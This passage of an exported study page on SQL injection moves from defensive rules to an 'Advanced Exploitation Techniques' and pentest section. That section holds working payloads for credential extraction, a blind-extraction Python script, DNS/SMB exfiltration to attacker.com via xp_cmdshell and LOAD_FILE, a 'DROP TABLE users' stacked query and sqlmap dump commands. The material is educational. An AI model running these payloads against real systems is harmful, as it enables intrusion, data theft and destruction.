+    elif input_type == &#x27;email&#x27;:
+        if not re.match(r&#x27;^[^@]+@[^@]+\.[^@]+$&#x27;, input_value):
+            raise ValueError(&quot;Invalid email&quot;)
+    return input_value
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8082-893e-eab7fa758585" class=""><strong>3. Use Least Privilege</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c3-b114-eb98a657b702" class=""><strong>Rule:</strong> Database users should have minimal required privileges.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a1-8ec0-d1e050c3f932" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f0-8436-d69a31b5afc7" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Application user
+GRANT SELECT, INSERT, UPDATE ON app_db.* TO &#x27;app_user&#x27;@&#x27;localhost&#x27;;
+
+-- Admin operations (separate user)
+GRANT ALL PRIVILEGES ON app_db.* TO &#x27;admin_user&#x27;@&#x27;localhost&#x27;;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-809f-8281-f17aa2d3840c" class=""><strong>4. Error Handling</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803c-ab1d-c9dc4ef83382" class=""><strong>Rule:</strong> Don&#x27;t expose database errors to users.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805b-b790-f4c467ea8398" class=""><strong>❌ WRONG:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8028-be20-e6523a46251c" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">try:
+    cursor.execute(query)
+except Exception as e:
+    return f&quot;Database error: {str(e)}&quot;  # Exposes database structure
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800d-ac4e-e2e98c1d90c8" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801c-977b-d8971f3a239d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">try:
+    cursor.execute(query)
+except Exception as e:
+    logger.error(f&quot;Database error: {str(e)}&quot;)
+    return &quot;An error occurred. Please try again.&quot;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800f-b1c0-c43a45cdd102" class=""><strong>5. Regular Security Testing</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8096-9695-d240e2f93685" class=""><strong>Rule:</strong> Test for SQL injection regularly.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8094-925d-ecb0b5680f53" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8080-b662-eda497773d16" class="bulleted-list"><li style="list-style-type:disc">Code reviews</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8066-8df8-d6d936ee4917" class="bulleted-list"><li style="list-style-type:disc">Penetration testing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806b-b58c-c4c0e1a2e5ec" class="bulleted-list"><li style="list-style-type:disc">SAST/DAST scanning</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8063-95ca-ec46f50cf196" class="bulleted-list"><li style="list-style-type:disc">Bug bounty programs</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-803a-962e-fcf0e4008f94"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80b6-89a5-e0299c4ca40f" class=""><strong>Advanced Exploitation Techniques</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80af-8c63-eb7e27e7164e" class=""><strong>1. Advanced Union-Based Extraction</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-b2f6-e1381af51735" class=""><strong>Technique:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8059-bb1e-f08846676564" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Determine column count
+&#x27; ORDER BY 1--
+&#x27; ORDER BY 2--
+&#x27; ORDER BY 3--
+-- Continue until error
+
+-- Extract data
+&#x27; UNION SELECT NULL, NULL, NULL--
+&#x27; UNION SELECT username, password, email FROM users--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8039-b5cb-ff13c847abce" class=""><strong>Real-World Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8052-bb85-dfdd94af6341" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Extract database version
+&#x27; UNION SELECT NULL, @@version, NULL--
+
+-- Extract table names
+&#x27; UNION SELECT NULL, table_name, NULL FROM information_schema.tables--
+
+-- Extract column names
+&#x27; UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name=&#x27;users&#x27;--
+
+-- Extract data
+&#x27; UNION SELECT NULL, username, password FROM users--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-807e-835d-f7a8b05eeb4c" class=""><strong>2. Time-Based Blind Extraction</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f6-acba-fa5d55abc6b8" class=""><strong>Technique:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d4-b358-e71f0335cf65" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Test if first character is &#x27;a&#x27;
+&#x27; AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--
+
+-- Extract character by character
+&#x27; AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))&gt;64, SLEEP(5), 0)--
+&#x27; AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))&lt;91, SLEEP(5), 0)--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8009-998b-c0dd5d63b520" class=""><strong>Automated Script:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f8-8fcf-e5f11f811dac" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import requests
+import time
+
+def extract_char(position):
+    for char_code in range(32, 127):
+        payload = f&quot;&#x27; AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={char_code}, SLEEP(5), 0)--&quot;
+        start = time.time()
+        requests.get(f&quot;http://target.com/search?q={payload}&quot;)
+        elapsed = time.time() - start
+        if elapsed &gt; 4:
+            return chr(char_code)
+    return None
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ce-8062-fe2126eb4fec" class=""><strong>3. Second-Order SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8080-8f9f-c6a1d8a5400b" class=""><strong>Attack Scenario:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f2-b075-f600bcfbbe6e" class=""><strong>Step 1: Register Malicious Username</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809e-b2b6-e28d3a2dd159" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Registration
+INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;&#x27;--&#x27;, &#x27;password&#x27;)
+-- Stored as: admin&#x27;--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8093-b987-ee372e9ce002" class=""><strong>Step 2: Exploit During Login</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804e-a6a3-eaeef0f0e6a6" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Login query
+SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;password&#x27;
+-- Executes: SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27;
+-- Bypasses password check!
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800a-bf7f-c11813f39153" class=""><strong>4. Out-of-Band Data Exfiltration</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8059-9410-d157bb24de27" class=""><strong>Technique:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8021-90a9-cd3f90e37c91" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- MSSQL: DNS exfiltration
+&#x27;; EXEC xp_cmdshell(&#x27;nslookup &#x27; + (SELECT password FROM users WHERE id=1) + &#x27;.attacker.com&#x27;)--
+
+-- MySQL: HTTP exfiltration
+&#x27; UNION SELECT NULL, LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, (SELECT password FROM users WHERE id=1), &#x27;.attacker.com\\test.txt&#x27;))--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f5-91e8-cb8c093090dd" class=""><strong>5. Stacked Queries</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806e-abb6-d0021298903b" class=""><strong>Technique:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d9-9038-c4a49efa56b0" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Execute multiple queries
+&#x27;; DROP TABLE users; SELECT * FROM logs--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8076-bce2-c471bcca1f7c" class=""><strong>Note:</strong> Not all databases/drivers support stacked queries.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-809b-ac42-c9a1609c31a2" class=""><strong>6. Boolean-Based Blind with Subqueries</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8097-8140-e61907923fbb" class=""><strong>Technique:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804c-846e-f317c6746416" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Test if user exists
+&#x27; AND (SELECT COUNT(*) FROM users WHERE username=&#x27;admin&#x27;)=1--
+
+-- Test password length
+&#x27; AND (SELECT LENGTH(password) FROM users WHERE username=&#x27;admin&#x27;)&gt;10--
+
+-- Extract character by character
+&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;admin&#x27;)=&#x27;a&#x27;--
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80a4-849c-ce9932bd1a38"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-801a-9a1c-c89c0b1b6f5f" class=""><strong>Penetration Testing Methodology</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c7-aaf1-e43cd65affac" class=""><strong>SQL Injection Testing Checklist</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d3-b244-e7276c9359bb" class=""><strong>1. Reconnaissance:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d4-909b-f38228af8410" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Identify input points
+- URL parameters
+- POST data
+- HTTP headers
+- Cookies
+- File uploads
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8001-8175-fe942f5667b0" class=""><strong>2. Vulnerability Detection:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8085-9b14-c51265be6840" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Test basic injection
+&#x27; OR &#x27;1&#x27;=&#x27;1
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--
+&#x27; OR 1=1--
+&#x27; OR 1=1#
+
+# Test for errors
+&#x27;
+&quot;
+`
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e2-8828-f0c67571be93" class=""><strong>3. Database Fingerprinting:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809a-970d-c559e733f757" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- MySQL
+&#x27; AND @@version LIKE &#x27;MySQL%&#x27;--
+
+-- MSSQL
+&#x27; AND @@version LIKE &#x27;Microsoft%&#x27;--
+
+-- PostgreSQL
+&#x27; AND version() LIKE &#x27;PostgreSQL%&#x27;--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8052-ba1b-ec67c7e462d4" class=""><strong>4. Schema Enumeration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8013-9cfa-f52b04b6bcc1" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- MySQL: List tables
+&#x27; UNION SELECT table_name FROM information_schema.tables--
+
+-- MSSQL: List tables
+&#x27; UNION SELECT name FROM sysobjects WHERE xtype=&#x27;U&#x27;--
+
+-- PostgreSQL: List tables
+&#x27; UNION SELECT tablename FROM pg_tables--
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a4-86cd-f185aac920fe" class=""><strong>5. Data Extraction:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a9-ac5f-c76a60806cea" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Extract column names
+&#x27; UNION SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27;--
+
+-- Extract data
+&#x27; UNION SELECT username, password FROM users--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-807c-bf41-cedd31562f60" class=""><strong>Testing Tools</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8085-8dfb-e6a62ab12551" class=""><strong>1. SQLMap:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8070-bfa6-f9fe560926c8" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Basic scan
+sqlmap -u &quot;http://target.com/page?id=1&quot; --dbs
+
+# Extract data
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database -T users --dump
+
+# Advanced options
+sqlmap -u &quot;http://target.com/page?id=1&quot; --level=5 --risk=3 --tamper=space2comment
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ef-aa21-c25706f1aaf6" class=""><strong>2. Burp Suite:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e7-b1ce-d63e2b3a7560" class="bulleted-list"><li style="list-style-type:disc">SQL injection scanner</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dc-9e72-f4d2d28fffa4" class="bulleted-list"><li style="list-style-type:disc">Manual testing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80de-ad84-f95401c683be" class="bulleted-list"><li style="list-style-type:disc">Intruder for fuzzing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a8-b6b7-dba6c5ae72c1" class="bulleted-list"><li style="list-style-type:disc">Repeater for payload testing</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803f-8bcd-fd97db79d6f1" class=""><strong>3. Custom Scripts:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80fd-8bf6-ccf2579c58c9" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import requests
+
+payloads = [
+    &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,
+    &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&quot;,
+    &quot;&#x27; UNION SELECT NULL--&quot;,
+    &quot;&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--&quot;
+]
+
+for payload in payloads:
+    response = requests.get(f&quot;http://target.com/search?q={payload}&quot;)
+    if &quot;error&quot; in response.text.lower() or response.elapsed.total_seconds() &gt; 4:
+        print(f&quot;Potential SQLi: {payload}&quot;)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8097-a644-ea7784cbabf1" class=""><strong>Common Findings in Penetration Tests</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8000-94f9-cf6fc08e1383" class=""><strong>1. Direct SQL Injection:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8028-a162-c468a1198f01" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding</strong>: User input directly concatenated into SQL</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801c-b420-c1a1ded75fe8" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: Critical</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8084-93a4-dfa408db8156" class="bulleted-list"><li style="list-style-type:disc"><strong>Evidence</strong>: <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code> bypasses 